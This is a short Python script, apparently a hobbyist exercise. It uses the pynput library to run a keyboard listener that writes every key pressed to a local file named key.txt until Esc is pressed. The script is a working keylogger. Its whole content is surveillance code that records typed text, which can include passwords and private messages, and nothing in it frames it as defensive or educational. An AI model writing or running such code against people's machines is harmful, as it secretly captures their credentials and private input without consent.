from pynput.keyboard import Listener, Key

#Create a Function
def on_added_key(kei):
    #end program Key
    #hidden key
    if kei == Key.esc:
        return False
    #key stor and key valu
    key_stor = str(kei)
    key_stor = key_stor.replace(",", "")
    key_stor = key_stor.replace("'", "")
    #stetment for key
    if kei == Key.space:
        key_stor = " "
    if kei == Key.enter:
        key_stor = "\n"
    if kei == Key.shift:
        key_stor = ""
    #Save key valu get_key.py in this File
    with open('key.txt', 'a') as f:
        f.write(key_stor)
        
with Listener(on_press=on_added_key) as listenr:
    listenr.join()

